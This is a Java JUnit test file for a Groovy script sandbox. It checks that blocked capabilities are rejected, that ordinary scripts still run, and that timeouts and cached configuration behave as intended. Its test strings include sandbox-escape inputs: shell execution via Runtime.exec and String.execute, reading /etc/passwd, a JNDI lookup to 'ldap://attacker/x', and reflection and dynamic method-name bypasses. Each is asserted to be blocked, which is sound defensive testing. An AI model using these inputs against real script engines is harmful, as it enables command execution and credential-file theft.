// Copyright tang.  All rights reserved.
// Use of this source code is governed by a BSD-style license
package com.cs.core.exec.engine.impl;

import cn.hutool.extra.spring.SpringUtil;
import groovy.lang.*;
import org.junit.*;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.Callable;

/**
 * Script sandbox and timeout test (S1): blacklisted capabilities are rejected at compile time, normal scripts still work,
 * and infinite-loop scripts can be interrupted by the thread (prerequisite for Future.cancel(true) to work).
 */
public class ScriptSandboxConfigurationTest {

    private Object evaluate(String script) {
        GroovyShell shell = ScriptSandboxConfiguration.createGroovyShell(new Binding());
        return shell.evaluate(script);
    }

    private void assertRejected(String script) {
        try {
            evaluate(script);
            Assert.fail("Script should have been rejected by sandbox: " + script);
        } catch (Exception expected) {
            // The sandbox rejects at compile time with CompilationFailedException/SecurityException
        }
    }

    @Test
    public void sandboxBlocksSystemExit() {
        assertRejected("System.exit(0)");
    }

    @Test
    public void sandboxBlocksRuntimeExec() {
        assertRejected("Runtime.getRuntime().exec('ls')");
    }

    @Test
    public void sandboxBlocksStringExecuteCommand() {
        assertRejected("'ls -la'.execute()");
        assertRejected("['sh','-c','ls'].execute()");
        // The compile-time receiver type of an untyped (def) variable holding a collection is Object; the runtime metaclass guard intercepts it
        assertRejected("def l = ['sh','-c','ls']; l.execute()");
        assertRejected("def l = new ArrayList(); l.add('ls'); l.execute()");
    }

    @Test
    public void sandboxBlocksReflection() {
        assertRejected("Class.forName('java.lang.Runtime')");
        assertRejected("import java.lang.reflect.Method; Method m = null");
    }

    @Test
    public void sandboxBlocksDynamicMethodNames() {
        // GString 动态方法名无法静态检查 —— fail-closed 拒绝，不允许绕过方法名黑名单
        assertRejected("def n = 'execute'; 'ls'.\"$n\"()");
        assertRejected("def n = 'forName'; Class.\"$n\"('java.lang.Runtime')");
    }

    @Test
    public void sandboxBlocksJndiLookup() {
        assertRejected("new javax.naming.InitialContext().lookup('ldap://attacker/x')");
        assertRejected("import javax.naming.Context; Context c = null");
        assertRejected("new javax.naming.directory.InitialDirContext()");
    }

    @Test
    public void sandboxBlocksReflectionThroughUntypedReceiver() {
        // def 变量编译期类型为 Object，绕过 receiversBlackList：方法名黑名单在编译期拦截
        assertRejected("def c = 'x'.class; c.newInstance()");
        assertRejected("def c = 'x'.class; c.getMethod('toString')");
        // 名单外方法在运行期由 java.lang.Class 元类守卫拦截
        assertRejected("def c = 'x'.class; c.getDeclaredMethods()");
        assertRejected("def c = 'x'.class; c.getResource('/')");
    }

    @Test
    public void sandboxBlocksFileAccess() {
        assertRejected("new java.io.File('/etc/passwd').text");
        assertRejected("new java.nio.file.Files()");
    }

    @Test
    public void sandboxBlocksGroovyEval() {
        assertRejected("Eval.me('1+1')");
        assertRejected("new GroovyShell().evaluate('System.exit(0)')");
    }

    @Test
    public void sandboxBlocksMethodPointer() {
        assertRejected("def m = this.&hashCode; m()");
    }

    @Test
    public void sandboxBlocksThreadCreation() {
        assertRejected("new Thread({}).start()");
        assertRejected("Thread.sleep(100)");
    }

    @Test
    public void sandboxAllowsCommonScripts() {
        Assert.assertEquals("ABC", evaluate("'abc'.toUpperCase()"));
        Assert.assertEquals(3, evaluate("def list=[3,1,2]; return list.size()"));
        Assert.assertEquals("3", evaluate("def sum=0; [1,2].each{ sum += it }; return sum.toString()"));
        Object formatted = evaluate(
                "def df = new java.text.SimpleDateFormat('yyyy-MM-dd'); return df.format(new java.util.Date()) != null");
        Assert.assertEquals(Boolean.TRUE, formatted);
        Assert.assertEquals("5", evaluate("def m=new java.util.HashMap(); m.put('k',5); return m.get('k').toString()"));
    }

    @Test
    public void timeoutDefaultsApplied() {
        Assert.assertTrue(ScriptSandboxConfiguration.isSandboxEnabled());
        Assert.assertEquals(60L, ScriptSandboxConfiguration.getScriptTimeoutSeconds());
    }

    /**
     * Infinite-loop scripts respond to thread interruption: verifies the ThreadInterrupt compilation customizer + Future.cancel(true) interruption chain.
     */
    @Test
    public void infiniteLoopScriptIsInterruptible() throws Exception {
        GroovyShell shell = ScriptSandboxConfiguration.createGroovyShell(new Binding());
        CountDownLatch started = new CountDownLatch(1);
        AtomicReference<Throwable> failure = new AtomicReference<>();
        Thread worker = new Thread(() -> {
            try {
                started.countDown();
                shell.evaluate("while(true) { }\n");
                failure.set(new AssertionError("infinite loop finished unexpectedly"));
            } catch (Throwable t) {
                // Expected: interruption surfaces as InterruptedException or a related exception
            }
        });
        worker.setDaemon(true);
        worker.start();
        Assert.assertTrue(started.await(5, TimeUnit.SECONDS));
        worker.interrupt();
        worker.join(5000);
        Assert.assertFalse("worker should terminate after interrupt", worker.isAlive());
        Assert.assertNull("infinite loop should not finish normally", failure.get());
    }

    // ------------------------------------------------------------------ cache/DCL branches

    private static Object readStatic(String fieldName) throws Exception {
        Field field = ScriptSandboxConfiguration.class.getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(null);
    }

    private static void writeStatic(String fieldName, Object value) throws Exception {
        Field field = ScriptSandboxConfiguration.class.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(null, value);
    }

    /**
     * Drives the second (inside-lock) null check of the double-checked caches: the worker
     * passes the outer check while the monitor is held by this thread, the cached value is
     * installed from outside while the worker still waits on the monitor, so the worker
     * must take the already-cached value instead of recomputing.
     */
    private static void assertSecondLockCheckSeesTheCachedValue(
            String fieldName, Object clearedValue, Object cachedValue, Callable<Object> reader)
            throws Exception {
        Object original = readStatic(fieldName);
        writeStatic(fieldName, clearedValue);
        try {
            AtomicReference<Object> observed = new AtomicReference<>();
            AtomicReference<Throwable> workerFailure = new AtomicReference<>();
            Thread worker = new Thread(() -> {
                try {
                    observed.set(reader.call());
                } catch (Throwable t) {
                    workerFailure.set(t);
                }
            }, "dcl-worker");
            // hold the class monitor so the worker blocks after passing the outer null check
            synchronized (ScriptSandboxConfiguration.class) {
                worker.start();
                long deadline = System.currentTimeMillis() + 5000L;
                while (worker.getState() != Thread.State.BLOCKED
                        && System.currentTimeMillis() < deadline) {
                    Thread.sleep(10L);
                }
                Assert.assertEquals("worker must be parked on the class monitor",
                        Thread.State.BLOCKED, worker.getState());
                writeStatic(fieldName, cachedValue);
            }
            worker.join(5000L);
            Assert.assertNull("worker must not fail: " + workerFailure.get(), workerFailure.get());
            Assert.assertEquals("the pre-cached value must be reused", cachedValue, observed.get());
        } finally {
            writeStatic(fieldName, original);
        }
    }

    @Test
    public void enabledFlagSecondLockCheckReusesTheCachedValue() throws Exception {
        assertSecondLockCheckSeesTheCachedValue("sandboxEnabled", null, Boolean.FALSE,
                (Callable<Object>) ScriptSandboxConfiguration::isSandboxEnabled);
    }

    @Test
    public void timeoutSecondLockCheckReusesTheCachedValue() throws Exception {
        assertSecondLockCheckSeesTheCachedValue("timeoutSeconds", null, 17L,
                (Callable<Object>) ScriptSandboxConfiguration::getScriptTimeoutSeconds);
    }

    @Test
    public void runtimeGuardSecondLockCheckSkipsReinstallation() throws Exception {
        Method install = ScriptSandboxConfiguration.class.getDeclaredMethod("installRuntimeGuards");
        install.setAccessible(true);
        // original flag state is restored by the helper; the worker skips the guard scripts
        // because the flag flips to true while it waits on the monitor
        assertSecondLockCheckSeesTheCachedValue("runtimeCommandGuardInstalled",
                Boolean.FALSE, Boolean.TRUE,
                (Callable<Object>) () -> {
                    install.invoke(null);
                    return Boolean.TRUE;
                });
    }

    @Test
    public void createGroovyShellWithoutSandboxBuildsAPlainShell() throws Exception {
        Object original = readStatic("sandboxEnabled");
        writeStatic("sandboxEnabled", Boolean.FALSE);
        try {
            GroovyShell plain = ScriptSandboxConfiguration.createGroovyShell(new Binding());
            // a blacklisted reference compiles fine when the sandbox is switched off
            Assert.assertNotNull(plain.parse("System.exit(0)"));
            Assert.assertEquals(Integer.valueOf(3), (Integer) plain.evaluate("1+2"));
        } finally {
            writeStatic("sandboxEnabled", original);
        }
    }

    @Test
    public void blankPropertyValuesFallBackToTheDefaults() throws Exception {
        Object environment = Proxy.newProxyInstance(
                ScriptSandboxConfigurationTest.class.getClassLoader(),
                new Class<?>[]{org.springframework.core.env.Environment.class},
                (proxy, method, args) -> {
                    if ("getProperty".equals(method.getName()) && null != args && args.length >= 1) {
                        return "   "; // blank: must be treated as unset
                    }
                    if ("hashCode".equals(method.getName())) {
                        return System.identityHashCode(proxy);
                    }
                    if ("toString".equals(method.getName())) {
                        return "blankEnvironment";
                    }
                    return null;
                });
        Object beanFactory = Proxy.newProxyInstance(
                ScriptSandboxConfigurationTest.class.getClassLoader(),
                new Class<?>[]{org.springframework.beans.factory.config.ConfigurableListableBeanFactory.class},
                (proxy, method, args) -> {
                    if ("getBean".equals(method.getName()) && null != args && 1 == args.length
                            && args[0] == org.springframework.core.env.Environment.class) {
                        return environment;
                    }
                    if ("hashCode".equals(method.getName())) {
                        return System.identityHashCode(proxy);
                    }
                    if ("toString".equals(method.getName())) {
                        return "blankBeanFactory";
                    }
                    return null;
                });
        Field beanFactoryField = SpringUtil.class.getDeclaredField("beanFactory");
        beanFactoryField.setAccessible(true);
        Object previousFactory = beanFactoryField.get(null);
        Object previousEnabled = readStatic("sandboxEnabled");
        Object previousTimeout = readStatic("timeoutSeconds");
        beanFactoryField.set(null, beanFactory);
        try {
            Assert.assertTrue("blank value must fall back to the enabled default",
                    ScriptSandboxConfiguration.isSandboxEnabled());
            Assert.assertEquals("blank value must fall back to the timeout default",
                    60L, ScriptSandboxConfiguration.getScriptTimeoutSeconds());
        } finally {
            beanFactoryField.set(null, previousFactory);
            writeStatic("sandboxEnabled", previousEnabled);
            writeStatic("timeoutSeconds", previousTimeout);
        }
    }

    // ------------------------------------------------------------------ ClassExpression checker branch

    @Test
    public void propertyValuesAreCachedAfterTheFirstLookup() throws Exception {
        // the outer null check of the double-checked lock: a second call must reuse the cache
        Object first = ScriptSandboxConfiguration.isSandboxEnabled();
        Assert.assertEquals(first, ScriptSandboxConfiguration.isSandboxEnabled());
        long timeout = ScriptSandboxConfiguration.getScriptTimeoutSeconds();
        Assert.assertEquals(timeout, ScriptSandboxConfiguration.getScriptTimeoutSeconds());
    }

    @Test
    public void configuredPropertyValuesAreUsedWhenPresent() throws Exception {
        Object environment = Proxy.newProxyInstance(
                ScriptSandboxConfigurationTest.class.getClassLoader(),
                new Class<?>[]{org.springframework.core.env.Environment.class},
                (proxy, method, args) -> {
                    if ("getProperty".equals(method.getName()) && null != args && args.length >= 1) {
                        if ("datapoly.executor.script.sandbox-enabled".equals(args[0])) {
                            return "true";
                        }
                        if ("datapoly.executor.script.timeout-seconds".equals(args[0])) {
                            return "33";
                        }
                        return null;
                    }
                    if ("hashCode".equals(method.getName())) {
                        return System.identityHashCode(proxy);
                    }
                    if ("toString".equals(method.getName())) {
                        return "configuredEnvironment";
                    }
                    return null;
                });
        Object beanFactory = Proxy.newProxyInstance(
                ScriptSandboxConfigurationTest.class.getClassLoader(),
                new Class<?>[]{org.springframework.beans.factory.config.ConfigurableListableBeanFactory.class},
                (proxy, method, args) -> {
                    if ("getBean".equals(method.getName()) && null != args && 1 == args.length
                            && args[0] == org.springframework.core.env.Environment.class) {
                        return environment;
                    }
                    if ("hashCode".equals(method.getName())) {
                        return System.identityHashCode(proxy);
                    }
                    if ("toString".equals(method.getName())) {
                        return "configuredBeanFactory";
                    }
                    return null;
                });
        Field beanFactoryField = SpringUtil.class.getDeclaredField("beanFactory");
        beanFactoryField.setAccessible(true);
        Object previousFactory = beanFactoryField.get(null);
        Object previousEnabled = readStatic("sandboxEnabled");
        Object previousTimeout = readStatic("timeoutSeconds");
        beanFactoryField.set(null, beanFactory);
        try {
            writeStatic("sandboxEnabled", null);
            writeStatic("timeoutSeconds", null);
            Assert.assertTrue("a configured value must win over the default",
                    ScriptSandboxConfiguration.isSandboxEnabled());
            Assert.assertEquals("a configured timeout must win over the default",
                    33L, ScriptSandboxConfiguration.getScriptTimeoutSeconds());
        } finally {
            beanFactoryField.set(null, previousFactory);
            writeStatic("sandboxEnabled", previousEnabled);
            writeStatic("timeoutSeconds", previousTimeout);
        }
    }

    @Test
    public void classLiteralOfAnAllowedTypePassesTheChecker() {
        // a bare class reference is visited as a ClassExpression: allowed types return true
        Assert.assertEquals(Integer.valueOf(3),
                evaluate("def c = java.math.BigDecimal; return c.valueOf(3).intValue()"));
    }

    @Test
    public void classLiteralOfABlacklistedTypeIsRejected() {
        assertRejected("def c = java.lang.System; c.currentTimeMillis()");
        assertRejected("def c = java.lang.Runtime; c.availableProcessors()");
    }

}
